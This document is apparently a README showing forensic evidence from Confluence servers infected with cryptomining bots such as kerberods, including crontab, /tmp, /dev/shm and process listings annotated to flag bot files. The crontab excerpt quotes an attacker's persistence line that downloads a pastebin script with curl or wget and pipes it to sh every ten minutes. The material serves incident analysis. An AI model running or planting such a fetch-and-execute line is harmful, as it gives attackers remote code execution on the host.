# KillerBot

## Example of Infected Server

We'll post findings from an infected confluence-systems we investigated recently, to show how it looks/feel like. the most systems we took a look at were infected with mining-bots like kerberods.

### Awkward crontab-entries for a user
```shell
/var/spool/cron/crontabs # ls -lrth
total 4.0K
-rw------- 1 root netdev 285 Apr 15 15:34 tmp.Rj8JOI
-rw-r--r-- 1 root netdev   0 Apr 16 12:42 root

cat tmp.Rj8JOI 

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Mon Apr 15 17:34:25 2019)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
*/10 * * * * (curl -fsSL https://pastebin.com/raw/404NoMore||wget -q -O- https://pastebin.com/raw/404NoMore)|sh
```

### Files in /tmp that look suspicious
- See below for the lok_bot
- At least you get an infection-date
```shell
# ls -la /tmp

total 1460
drwxrwxrwt 1 root root    4096 Apr 29 08:05 .
drwxr-xr-x 1 root ro      4096 May 10  2018 ..
-rw-r--r-- 1 usr1 usr1       0 Apr 27 14:17 .354da7
-rw-r--r-- 1 usr1 usr1       5 Apr 22 06:23 .XIMunix
drwxr-xr-x 2 usr1 usr1    4096 Apr 19 17:45 .dba         <-- Bot
drwxrwx--- 2 usr1 usr1    4096 Apr 27 21:42 .sysinfo     <-- Bot
-rw-r--r-- 1 usr1 usr1   20094 Apr 27 20:33 fk           <-- KillerBot
drwxr-xr-x 2 usr1 usr1    4096 Mar 13 08:41 hsperfdata_usr1
drwxr-xr-x 2 root root    4096 Oct  7  2016 hsperfdata_root
-rwx------ 1 usr1 usr1  480296 Apr 27 21:42 ib_cm
-rwx------ 1 usr1 usr1  480296 Apr 27 21:42 kworker_0:2
-rwx------ 1 usr1 usr1  473096 Apr 22 18:30 kworker_1:1
-rw-r--r-- 1 usr1 usr1       0 Apr 19 18:04 lok          <-- Bot
-rw-r--r-- 1 usr1 usr1      12 Apr 27 20:33 tmp1         <-- Bot
-rw-r--r-- 1 usr1 usr1       0 Apr 21 18:25 .changgggeerror <--Bot
drwxr-xr-x 2 usr1 usr1    4096 Apr 27 15:18 .dba         <-- Bot
-rw-r--r-- 1 usr1 usr1       0 Apr 29 06:38 .dbb         <-- Bot
-rw-r--r-- 1 usr1 usr1     290 Apr 17 06:57 04dlOCl      <-- Bot
-rw-r--r-- 1 usr1 usr1     290 Apr 21 04:50 09m4JAO      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 17 07:17 0B74AiN      <-- Bot
-rw-r--r-- 1 usr1 usr1     290 Apr 24 06:28 0C3GIEc      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 14 22:50 1LgBCd8      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 14 21:03 jEgLnBc      <-- Bot
-rwxr-xr-x 1 usr1 usr1 1099016 Apr 29 06:38 jGcLFA1      <-- Bot
drwxr-xr-x 2 usr1 usr1    4096 Apr 19 12:47 khugepageds  <-- Bot
-rw-r--r-- 1 usr1 usr1     290 Apr 23 00:22 lIFa09m      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 14 11:26 lLNCeDg      <-- Bot
-rw-r--r-- 1 usr1 usr1     290 Apr 15 00:37 lMBH5ME      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 27 14:55 lalmC9B      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 24 17:08 lc6hCJM      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 23 03:33 lgl7kBp      <-- Bot
-rw-r--r-- 1 usr1 usr1     160 Apr 23 11:32 m3eP059      <-- Bot

--- 400 lines deleted ----
```


### Files in /dev/shm that looks suspiciuous
- See below for the bot
- At least you get an infection-date

```shell
# ls -la /dev/shm

total 8
drwxrwxrwt 2 root   root     60 Apr 18 17:53 .
drwxr-xr-x 5 root   root    340 Oct 10  2018 ..
-rw-r--r-- 1 daemon daemon 7141 Apr 18 16:33 bt1.txt
-rwxrwxrwx 1 daemon daemon 621K Mar 18 06:51 1mm6dgJ          <-- maybe?
-rw-r--r-- 1 daemon daemon    0 Apr 12 07:48 ec2a6            <-- ???
-rw-r--r-- 1 daemon daemon    0 Apr 12 07:48 de33f4f911f20761 <-- ???
-rw-r--r-- 1 daemon daemon  290 Apr 14 01:12 L2AJgih          <-- exploit 
-rw-r--r-- 1 daemon daemon  160 Apr 14 01:12 77Ink36          <-- exploit 
-rw-r--r-- 1 daemon daemon  290 Apr 14 01:15 H4m361b          <-- exploit 
-rw-r--r-- 1 daemon daemon  160 Apr 14 01:15 1Gn6il2          <-- exploit 
-rw-r--r-- 1 daemon daemon  290 Apr 14 01:29 JnImMDp          <-- exploit 
-rw-r--r-- 1 daemon daemon  160 Apr 14 01:29 8N128a8          <-- exploit 
-rw-r--r-- 1 daemon daemon  290 Apr 14 01:50 1bI0A61          <-- exploit 
-rw-r--r-- 1 daemon daemon  160 Apr 14 01:50 Jb2jHPC          <-- exploit 
-rw-r--r-- 1 daemon daemon  290 Apr 14 02:03 aEEC4K5          <-- exploit 
```

### Zombie-processes
```shell
# ps -ef

UID        PID  PPID  C STIME TTY          TIME CMD
usr1     1     0  1 Mar13 ?        12:56:36 /usr/bin/java -Djava.util.logging.config.file=/opt/atlassian/confluence/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Xms1024m -Xmx8192m -XX:MaxPermSize=512m -XX:+UseG1GC -Djava.awt.headless=true -Xloggc:/opt/atlassian/confluence/logs/gc-2019-03-13_08-41-53.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=2M -XX:-PrintGCDetails -XX:+PrintGCTimeStamps -XX:-PrintTenuringDistribution -Djava.endorsed.dirs=/opt/atlassian/confluence/endorsed -classpath /opt/atlassian/confluence/bin/bootstrap.jar:/opt/atlassian/confluence/bin/tomcat-juli.jar -Dcatalina.base=/opt/atlassian/confluence -Dcatalina.home=/opt/atlassian/confluence -Djava.io.tmpdir=/opt/atlassian/confluence/temp org.apache.catalina.startup.Bootstrap start
usr1   336     1  0 Apr19 ?        00:00:00 [kill] <defunct>
usr1   339     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   354     1  0 Apr19 ?        00:00:00 [kill] <defunct>
usr1   361     1  0 Apr17 ?        00:00:00 [kill] <defunct>
usr1   382     1  0 Apr19 ?        00:00:00 [kill] <defunct>
usr1   403     1  0 Apr18 ?        00:00:00 [kill] <defunct>
usr1   415     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   427     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   462     1  0 Apr22 ?        00:00:00 [kill] <defunct>
usr1   508     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   516     1  0 Apr18 ?        00:00:00 [kill] <defunct>
usr1   529     1  0 Apr20 ?        00:00:00 [kill] <defunct>
usr1   539     1  0 Apr20 ?        00:00:00 [kill] <defunct>
usr1   544     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   597     1  0 Apr22 ?        00:00:00 [kill] <defunct>
usr1   599     1  0 Apr18 ?        00:00:00 [kill] <defunct>
usr1   642     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   644     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   648     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   663     1  0 Apr20 ?        00:00:00 [kill] <defunct>
usr1   688     1  0 Apr20 ?        00:00:00 [kill] <defunct>
usr1   756     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   858     1  0 Apr22 ?        00:00:00 [kill] <defunct>
usr1   903     1  0 Apr21 ?        00:00:00 [kill] <defunct>
usr1   960     1  0 Apr20 ?        00:00:00 [kill] <defunct>
usr1  1015     1  0 Apr17 ?        00:00:00 [sh] <defunct>
usr1  1072     1  0 Apr20 ?        00:00:00 [kill] <defunct>
```